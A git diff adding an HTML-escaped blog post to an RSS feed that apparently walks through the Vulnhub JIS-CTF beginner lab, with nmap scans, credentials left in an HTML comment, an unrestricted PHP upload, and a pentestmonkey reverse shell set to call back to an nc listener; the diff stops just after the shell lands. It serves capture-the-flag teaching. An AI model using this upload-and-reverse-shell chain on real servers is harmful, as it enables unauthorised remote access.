@@ -7,6 +7,377 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Vulnhub.com - JIS-CTF</title>
+        <description>&lt;p&gt;Today we’re going to work on a challenge from Vulnhub called &lt;strong&gt;&lt;em&gt;JIS-CTF&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;VM Name: JIS-CTF : VulnUpload
+
+Difficulty: Beginner
+
+Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Author: &lt;a href=&quot;https://twitter.com/@banyrock&quot;&gt;Mohammad Khreesha&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Download: &lt;a href=&quot;https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/&quot;&gt;https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Firstly, we’re going to scan the whole network with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; in order to find the IP address of the machine.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap 10.0.0.0/24
+Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-06-27 03:38 EDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.3
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000084s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+All 1000 scanned ports on 10.0.0.3 are filtered
+MAC Address: 08:00:27:EB:97:9B &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.5
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00020s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:68:18:58 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.4
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0000080s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+All 1000 scanned ports on 10.0.0.4 are closed
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 256 IP addresses &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5 hosts up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;5.90 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, from the beginning we can see that both &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; services are up and running. In order to make the best performance I’m going to run more comprehensive scan in the background while checking services manually.&lt;/p&gt;
+
+&lt;p&gt;Firstly, the &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; service does not appear to be anything different than any ‘normal’ ssh services.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# ssh root@10.0.0.5
+The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.0.0.5 (10.0.0.5)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
+ECDSA key fingerprint is SHA256:ThPvIGqyDX2PSqt5JWHyy/J/Hy2hK5aVcpKTpkTKHQE.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '&lt;/span&gt;10.0.0.5&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
+root@10.0.0.5'&lt;/span&gt;s password: 
+Permission denied, please try again.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In the meantime the other &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan has finished, so we can take a look at it.&lt;/p&gt;
+
+&lt;p&gt;What parameters I’m using?&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;-p-&lt;/em&gt; - scan all 65535 ports&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-v&lt;/em&gt; - verbose output&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-sS&lt;/em&gt; - TCP-SYN scan&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-A&lt;/em&gt; - OS detection, version detection and traceroute&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-T4&lt;/em&gt; - aggresive scan&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Starting Nmap 7.70 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2018-06-27 03:45 EDT
+NSE: Loaded 148 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 03:45
+Completed NSE at 03:45, 0.00s elapsed
+Initiating NSE at 03:45
+Completed NSE at 03:45, 0.00s elapsed
+Initiating ARP Ping Scan at 03:45
+Scanning 10.0.0.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
+Completed ARP Ping Scan at 03:45, 0.04s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Parallel DNS resolution of 1 host. at 03:45
+Completed Parallel DNS resolution of 1 host. at 03:45, 0.01s elapsed
+Initiating SYN Stealth Scan at 03:45
+Scanning 10.0.0.5 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 22/tcp on 10.0.0.5
+Discovered open port 80/tcp on 10.0.0.5
+Completed SYN Stealth Scan at 03:45, 4.07s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Service scan at 03:45
+Scanning 2 services on 10.0.0.5
+Completed Service scan at 03:45, 6.25s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.0.5&lt;/span&gt;
+NSE: Script scanning 10.0.0.5.
+Initiating NSE at 03:45
+Completed NSE at 03:45, 1.45s elapsed
+Initiating NSE at 03:45
+Completed NSE at 03:45, 0.00s elapsed
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.5
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00048s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 af:b9:68:38:77:7c:40:f6:bf:98:09:ff:d9:5f:73:ec &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 b9:df:60:1e:6d:6f:d7:f6:24:fd:ae:f8:e3:cf:16:ac &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 78:5a:95:bb:d5:bf:ad:cf:b2:f5:0f:c0:0c:af:f7:76 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 8 disallowed entries 
+| / /backup /admin /admin_area /r00t /uploads 
+|_/uploaded_files /flag
+|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| http-title: Sign-Up/Login Form
+|_Requested resource was login.php
+MAC Address: 08:00:27:68:18:58 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Uptime guess: 0.003 days &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;since Wed Jun 27 03:41:59 2018&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Network Distance: 1 hop
+TCP Sequence Prediction: &lt;span class=&quot;nv&quot;&gt;Difficulty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;263 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Good luck!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.48 ms 10.0.0.5
+
+NSE: Script Post-scanning.
+Initiating NSE at 03:45
+Completed NSE at 03:45, 0.00s elapsed
+Initiating NSE at 03:45
+Completed NSE at 03:45, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.32 seconds
+           Raw packets sent: 65558 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.885MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 65550 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.623MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From this we can already see the directory structure behind the &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; service.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;| http-robots.txt: 8 disallowed entries 
+| / /backup /admin /admin_area /r00t /uploads 
+|_/uploaded_files /flag
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-title: Sign-Up/Login Form&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Let’s head for the flag at first in &lt;code class=&quot;highlighter-rouge&quot;&gt;/flag&lt;/code&gt; directory.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;The 1st flag is : {8734509128730458630012095}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we’re iterating over the directories in &lt;code class=&quot;highlighter-rouge&quot;&gt;robots.txt&lt;/code&gt;. In &lt;code class=&quot;highlighter-rouge&quot;&gt;admin_area&lt;/code&gt; we can find the second flag.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;
+Fake admin area :)
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;The admin area not work :) &lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!--	username : admin
+	password : 3v1l_H@ck3r
+	The 2nd flag is : {7412574125871236547895214}
+--&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now as we have the credentials to login into the main &lt;code class=&quot;highlighter-rouge&quot;&gt;login.php&lt;/code&gt;, I decided to already check other directories. You simply can’t leave stuff untouched as there may be some clues.&lt;/p&gt;
+
+&lt;p&gt;Only &lt;code class=&quot;highlighter-rouge&quot;&gt;/uploaded_files/&lt;/code&gt; are present but for now, it’s a blank file. Coming back to &lt;code class=&quot;highlighter-rouge&quot;&gt;login.php&lt;/code&gt;, we’re ready to log into the account.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;check_login.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;field-wrap&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&amp;gt;&lt;/span&gt;
+        Username&lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;req&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;user_name&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;required&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;autocomplete=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+     &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;field-wrap&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&amp;gt;&lt;/span&gt;
+            Password&lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;req&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass_word&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;required&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;autocomplete=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;off&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt; 
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;button button-block&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;Log In&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After redirection, we are presented with possibility to upload files.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;header&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;File Upload Center&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/header&amp;gt;&lt;/span&gt;
+		
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dropbox&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;enctype=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;image&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+            &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upload File&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;At first, I decide to create a file that will check whether or not &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; code will execute.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/vulnhub/jis-ctf# vi test.php
+root@kali:~/vulnhub/jis-ctf# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;test.php 
+&amp;lt;?php
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Will it work?&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can see a simple &lt;code class=&quot;highlighter-rouge&quot;&gt;Success&lt;/code&gt; message but in &lt;code class=&quot;highlighter-rouge&quot;&gt;/uploaded_files&lt;/code&gt; directory there’s no change from the last state, still blank file. That’s when I noticed that we have to append the name of the file to the directory just like this &lt;code class=&quot;highlighter-rouge&quot;&gt;uploaded_files/test.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;And to surprise, &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; code is executed.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Will it work?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now my goal is to get and upload &lt;code class=&quot;highlighter-rouge&quot;&gt;php reverse shell&lt;/code&gt; from &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell&quot;&gt;pentestmonkey&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;As always, we have to change the IP address in this file in order to work.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/vulnhub/jis-ctf# &lt;span class=&quot;nb&quot;&gt;touch &lt;/span&gt;reverse-shell.php
+root@kali:~/vulnhub/jis-ctf# vi reverse-shell.php 
+root@kali:~/vulnhub/jis-ctf# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;reverse-shell.php 
+&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'10.0.0.4'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  // CHANGE THIS
+&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1234&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       // CHANGE THIS&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;At that moment we are ready to run the listener with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; that will listen for connection from reverse shell.&lt;/p&gt;
+
+&lt;p&gt;What does the parameters mean?&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;em&gt;-l&lt;/em&gt; - listen&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-v&lt;/em&gt; - verbose output&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-n&lt;/em&gt; - don’t do DNS lookups&lt;/li&gt;
+  &lt;li&gt;&lt;em&gt;-p 1234&lt;/em&gt; - specify port 1234&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 1234
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now in the same way that worked with the previous file, we’re going to upload the reverse shell and go to that file with &lt;code class=&quot;highlighter-rouge&quot;&gt;/uploaded_files/reverse_shell.php&lt;/code&gt;. In the meantime, &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; should be able to ‘catch’ the connection.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 1234
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 1234 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.4] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.0.5] 55562
+Linux Jordaninfosec-CTF01 4.4.0-128-generic &lt;span class=&quot;c&quot;&gt;#154-Ubuntu SMP Fri May 25 14:15:18 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
+ 11:38:26 up 33 min,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we’re ready to fully explore the system. Firstly, I’m going to check home directory for present users.&lt;/p&gt;
+
